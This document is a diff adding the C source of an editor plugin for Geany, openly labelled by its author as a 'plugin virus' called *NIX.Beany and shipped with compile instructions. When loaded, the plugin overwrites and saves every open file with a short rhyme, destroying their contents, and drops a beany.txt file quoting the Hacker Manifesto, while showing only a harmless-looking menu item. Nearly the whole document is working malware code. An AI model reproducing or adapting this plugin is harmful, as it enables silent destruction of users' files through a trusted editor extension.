@@ -1,0 +1,92 @@
+#include "geanyplugin.h"
+#include "document.h"
+
+//
+//  *NIX.Beany - Plugin Virus for Geany
+//
+//  This is my first virus written in C.
+//  Maybe it's not that sophisticated or polymorphic but for my first
+//  steps in C, it's pretty awesome :P
+//
+//
+//  Beany overwrites all the loaded files in geany with a little "poem".
+//  Then it creates a file with a piece of the text from the Hacker
+//  manifesto! It's a PoC and will be extended in one of the next
+//  coming ezines :)
+//
+//  Compiling instructions:
+//  gcc -c plugin.c -fPIC `pkg-config --cflags geany`
+//  gcc plugin.o -o plugin.so -shared `pkg-config --libs geany`
+//
+//
+//  by Perforin - [vxnetw0rk]
+//
+
+GeanyPlugin     *geany_plugin;
+GeanyData       *geany_data;
+GeanyFunctions  *geany_functions;
+GeanyDocument   *pay;
+
+PLUGIN_VERSION_CHECK(147)
+
+PLUGIN_SET_INFO("Beany", "Just another plugin virus",
+                "0.1", "Perforin [vxnetw0rk]");
+                
+int i;
+
+char *payloadpoem = "Row, row, row your boat,\n"                        \
+            "Gently down the stream.\n"                                 \
+            "Merrily, merrily, merrily,"                                \
+            "merrily,\nLife is but a dream.\n\n"                        \
+            "*NIX.Beany - Perforin [vxnetw0rk]";                
+
+char *payloadtext = "We explore... and you call us criminals.\n"        \
+"We seek after knowledge... and you call us criminals.\n"               \
+"We exist without skin color, without nationality, without religious\n" \
+"bias... and you call us criminals. You build atomic bombs, you wage\n" \
+"wars,you murder, cheat, and lie to us and try to make us believe it\n" \
+"is for our own good, yet we are the criminals.\n\n"                    \
+"Yes, I am a criminal.\n"                                               \
+"My crime is that of curiosity.\n"                                      \
+"My crime is that of judging people by what they say and think,\n"      \
+"not what they look like. My crime is that of outsmarting you,\n"       \ 
+"something that you will never forgive me for.";
+
+static GtkWidget *main_menu_item = NULL;
+
+static void item_activate_cb(GtkMenuItem *menuitem, gpointer gdata)
+{                           
+    dialogs_show_msgbox(GTK_MESSAGE_INFO, payloadpoem); 
+}
+
+void plugin_init(GeanyData *data)
+{
+    
+    main_menu_item = gtk_menu_item_new_with_mnemonic("Beany");
+    gtk_widget_show(main_menu_item);
+    gtk_container_add(GTK_CONTAINER(geany->main_widgets->tools_menu),main_menu_item);
+    g_signal_connect(main_menu_item, "activate",
+    G_CALLBACK(item_activate_cb), NULL);
+        
+        
+ for (i = 0; i < GEANY(documents_array)->len; i++) {                    // get all loaded files
+ 
+         if (documents[i]->is_valid) {  
+            GeanyDocument * doc = document_get_from_page(i);    
+            gint pos = sci_get_current_position(doc->editor->sci);
+            sci_set_text(doc->editor->sci, payloadpoem);                // SET Payloadtext
+            document_save_file(doc,1);                                  // Overwrite all files      
+            }
+    }
+    
+    pay = document_new_file("beany.txt",NULL,payloadtext);              // PAYLOAD: create new file
+    document_save_file_as(pay,"beany.txt");                             // PAYLOAD: save new file
+            
+}
+
+    
+
+void plugin_cleanup(void)
+{
+    gtk_widget_destroy(main_menu_item);
+} 
